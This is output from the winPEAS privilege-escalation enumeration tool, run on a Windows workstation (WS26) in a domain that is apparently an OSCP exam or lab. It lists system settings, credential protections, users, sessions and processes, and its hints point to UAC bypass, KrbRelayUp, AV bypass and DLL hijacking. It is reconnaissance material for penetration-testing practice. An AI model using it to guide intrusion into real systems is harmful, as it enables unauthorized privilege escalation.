╔══════════╣ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    10/10/2024 7:50:09 PM

╔══════════╣ User Environment Variables
╚ Check for some passwords or keys in the env variables 
    COMPUTERNAME: WS26
    PSExecutionPolicyPreference: Bypass
    HOMEPATH: \Users\r.andrews
    LOCALAPPDATA: C:\Users\r.andrews\AppData\Local
    windir: C:\Windows
    PSModulePath: C:\Users\r.andrews\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\DC20
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    TEMP: C:\Users\R8A36~1.AND\AppData\Local\Temp
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\r.andrews\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: r.andrews
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    USERPROFILE: C:\Users\r.andrews
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: OSCP
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\R8A36~1.AND\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    USERDNSDOMAIN: OSCP.EXAM
    USERDOMAIN: OSCP
    PUBLIC: C:\Users\Public
    EFC_4916: 1

╔══════════╣ System Environment Variables
╚ Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

╔══════════╣ Audit Settings
╚ Check what is being logged 
    Not Found

╔══════════╣ Audit Policy Settings - Classic & Advanced

╔══════════╣ WEF Settings
╚ Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

╔══════════╣ LAPS Settings
╚ If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

╔══════════╣ Wdigest
╚ If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

╔══════════╣ LSA Protection
╚ If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

╔══════════╣ Credentials Guard
╚ If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

╔══════════╣ Cached Creds
╚ If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

╔══════════╣ Enumerating saved credentials in Registry (CurrentPass)

╔══════════╣ AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

╔══════════╣ Windows Defender configuration
  Local Settings
  Group Policy Settings

╔══════════╣ UAC Status
╚ If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.

╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.22621.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 209B

╔══════════╣ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

╔══════════╣ PS default transcripts history
╚ Read the PS history inside these files (if any)

╔══════════╣ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 10240
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 0
    EnableNegotiate: 1
    ProxyEnable: 0
    MigrateProxy: 1

╔══════════╣ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

╔══════════╣ Drives Information
╚ Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 22 GB)(Permissions: Authenticated Users [Allow: AppendData/CreateDirectories])
    D:\ (Type: CDRom)

╔══════════╣ Checking WSUS
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

╔══════════╣ Checking KrbRelayUp
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (OSCP) so it could be vulnerable.
╚ You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

╔══════════╣ Checking If Inside Container
╚ If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

╔══════════╣ Checking AlwaysInstallElevated
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

╔══════════╣ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Authentication Packages              :       msv1_0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       scecli
    Security Packages                    :       ""
    LsaPid                               :       748
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       4
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    RunAsPPL                             :       0
    IsPplAutoEnabled                     :       1
    SCENoApplyLegacyAuditPolicy          :       0
    TurnOffAnonymousBlock                :       0
    LsaConfigFlags                       :       0
    RunAsPPLBoot                         :       0

╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

╔══════════╣ Display Local Group Policy settings - local users/machine
   Type             :     machine
   Display Name     :     Default Domain Policy
   Name             :     {31B2F340-016D-11D2-945F-00C04FB984F9}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
   File Sys Path    :     C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\oscp.exam\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
   Link             :     LDAP://DC=oscp,DC=exam
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     user
   Display Name     :     Local Group Policy
   Name             :     Local Group Policy
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\Windows\System32\GroupPolicy\User
   Link             :     Local
   GPO Link         :     Local Machine
   Options          :     All Sections Enabled

   =================================================================================================


╔══════════╣ Potential GPO abuse vectors (applied domain GPOs writable by current user)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

╔══════════╣ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



╔══════════╣ Enumerating Printers (WMI)

╔══════════╣ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  LOCAL\crashpad_3752_YXBGRVGITCBSAATA                                                                 r.andrews [Allow: AllAccess]                                           O:S-1-5-21-2481101513-2954867870-2660283483-1106G:DUD:(A;;FA;;;SY)(A;;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1106)(A;;0x12019f;;;AC)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


╔══════════╣ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           

   =================================================================================================


╔══════════╣ Enumerating Sysmon configuration
      You must be an administrator to run this check

╔══════════╣ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

╔══════════╣ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.8.09032

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : True
      OS supports AMSI               : True
        [!] The highest .NET version is enrolled in AMSI!


════════════════════════════════════╣ Interesting Events information ╠════════════════════════════════════

╔══════════╣ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

╔══════════╣ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

╔══════════╣ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

╔══════════╣ PowerShell events - script block logs (EID 4104) - searching for sensitive data.


╔══════════╣ Displaying Power off/on events for last 5 days



════════════════════════════════════╣ Users Information ╠════════════════════════════════════

╔══════════╣ Users
╚ Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  Current user: r.andrews
  Current groups: Domain Users, Everyone, Builtin\Remote Desktop Users, Builtin\Remote Management Users, Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local, Authentication authority asserted identity
   =================================================================================================

    WS26\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WS26\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WS26\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WS26\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-NotExpi-Req


╔══════════╣ Current User Idle Time
   Current User   :     OSCP\r.andrews
   Idle Time      :     00h:01m:44s:203ms

╔══════════╣ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

╔══════════╣ Current Token privileges
╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED

╔══════════╣ Clipboard text

╔══════════╣ Logged users
    OSCP\r.andrews

╔══════════╣ Display information about local users
   Computer Name           :   WS26
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/21/2026 7:02:00 PM
   Logons Count            :   27
   Password Last Set       :   10/9/2024 10:41:39 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 1:44:21 PM

   =================================================================================================


╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#0      r.andrews      OSCP                     Active    192.168.49.104

╔══════════╣ Ever logged users
    WS26\Administrator
    OSCP\r.andrews

╔══════════╣ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]
    C:\Users\r.andrews : r.andrews [Allow: AllAccess]

╔══════════╣ Looking for AutoLogon credentials
    Not Found

╔══════════╣ Password Policies
╚ Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_LOCKOUT_ADMINS
   =================================================================================================

    Domain: WS26
    SID: S-1-5-21-2756297892-2186407355-380279769
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_LOCKOUT_ADMINS
   =================================================================================================


╔══════════╣ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2695985
    Logon Time:                   
    Logon Type:                   RemoteInteractive
    Start Time:                   2/21/2026 7:03:11 PM
    Domain:                       OSCP
    Authentication Package:       Kerberos
    Start Time:                   2/21/2026 7:03:11 PM
    User Name:                    r.andrews
    User Principal Name:          
    User SID:                     

   =================================================================================================

    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2636154
    Logon Time:                   
    Logon Type:                   Network
    Start Time:                   2/21/2026 7:03:05 PM
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   2/21/2026 7:03:05 PM
    User Name:                    r.andrews
    User Principal Name:          
    User SID:                     

   =================================================================================================



════════════════════════════════════╣ Processes Information ╠════════════════════════════════════

╔══════════╣ Interesting Processes -non Microsoft-
╚ Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
    rdpclip(6920)[C:\Windows\System32\rdpclip.exe] -- POwn: r.andrews
    Command Line: rdpclip
   =================================================================================================

    explorer(4916)[C:\Windows\Explorer.EXE] -- POwn: r.andrews
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    msedgewebview2(8588)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=gpu-process --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1868 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:2
   =================================================================================================

    TextInputHost(8828)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca
   =================================================================================================

    sihost(4124)[C:\Windows\system32\sihost.exe] -- POwn: r.andrews
    Command Line: sihost.exe
   =================================================================================================

    StartMenuExperienceHost(8060)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
   =================================================================================================

    winPEASx64(4848)[C:\Users\r.andrews\winPEASx64.exe] -- POwn: r.andrews -- isDotNet
    Permissions: r.andrews [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\r.andrews (r.andrews [Allow: AllAccess])
    Command Line: "C:\Users\r.andrews\winPEASx64.exe"
   =================================================================================================

    UserOOBEBroker(6636)[C:\Windows\System32\oobe\UserOOBEBroker.exe] -- POwn: r.andrews
    Command Line: C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
   =================================================================================================

    svchost(7248)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    dllhost(4796)[C:\Windows\system32\DllHost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
   =================================================================================================

    Notepad(1916)[C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2408.12.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2408.12.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe" 
   =================================================================================================

    svchost(4352)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    RuntimeBroker(7400)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: r.andrews
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    vmtoolsd(1292)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
   =================================================================================================

    svchost(7288)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UdkSvcGroup -s UdkUserSvc
   =================================================================================================

    msedgewebview2(9004)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=renderer --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --js-flags="--harmony-weak-refs-with-cleanup-some --expose-gc" --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1366500608 --mojo-platform-channel-handle=3220 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:1
   =================================================================================================

    Widgets(3404)[C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe" -ServerName:Microsoft.Windows.DashboardServer
   =================================================================================================

    svchost(7640)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
   =================================================================================================

    svchost(3964)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    RuntimeBroker(8164)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: r.andrews
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    msedgewebview2(1460)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=2208 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:8
   =================================================================================================

    powershell(9116)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass
   =================================================================================================

    ShellExperienceHost(8944)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    conhost(6776)[C:\Windows\system32\conhost.exe] -- POwn: r.andrews
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    dllhost(8556)[C:\Windows\system32\DllHost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    SearchHost(8052)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" -ServerName:CortanaUI.AppXstmwaab17q5s3y22tp6apqz7a45vwv65.mca
   =================================================================================================

    msedgewebview2(5800)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=crashpad-handler --user-data-dir=C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=100.0.4896.75 "--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --annotation=plat=Win64 "--annotation=prod=Edge WebView2" --annotation=ver=100.0.1185.36 --initial-client-data=0x134,0x138,0x13c,0x110,0x148,0x7ff8f749d840,0x7ff8f749d850,0x7ff8f749d860
   =================================================================================================

    svchost(8084)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s NPSMSvc
   =================================================================================================

    taskhostw(6740)[C:\Windows\system32\taskhostw.exe] -- POwn: r.andrews
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    msedgewebview2(3752)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --mojo-named-platform-channel-pipe=3404.6896.6822827938938489019
   =================================================================================================

    OneDrive(9012)[C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: r.andrews
    Permissions: r.andrews [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive (r.andrews [Allow: AllAccess])
    Command Line:  /setautostart /background
   =================================================================================================

    powershell(4236)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
   =================================================================================================

    msedgewebview2(4172)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=1968 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:3
   =================================================================================================


╔══════════╣ Vulnerable Leaked Handlers
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
╚ Getting Leaked Handlers, it might take some time...
[######----]  62% |4% /#---]  72% -5% \#--]  82% |8% /9% -#-]  90% \|/3% -                       Handle: 1652(file)
    Handle Owner: Pid is 4848(winPEASx64) with owner: r.andrews
    Reason: TakeOwnership
